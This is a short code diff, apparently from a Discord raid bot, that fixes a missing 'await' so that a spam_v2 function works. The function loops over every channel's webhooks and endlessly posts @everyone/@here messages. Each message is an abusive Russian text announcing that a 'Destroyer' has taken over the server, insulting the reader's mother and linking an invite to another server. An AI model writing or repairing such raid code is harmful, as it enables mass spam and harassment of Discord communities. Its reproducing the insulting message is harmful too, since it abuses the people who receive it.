@@ -79,7 +79,7 @@ async def act7(ctx):
 
 async def spam_v2(ctx):
     for channel in ctx.guild.text_channels:
-        for hook in channel.webhooks():
+        for hook in await channel.webhooks():
             while True:
                 jsonn = {
                     "content": "@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK"
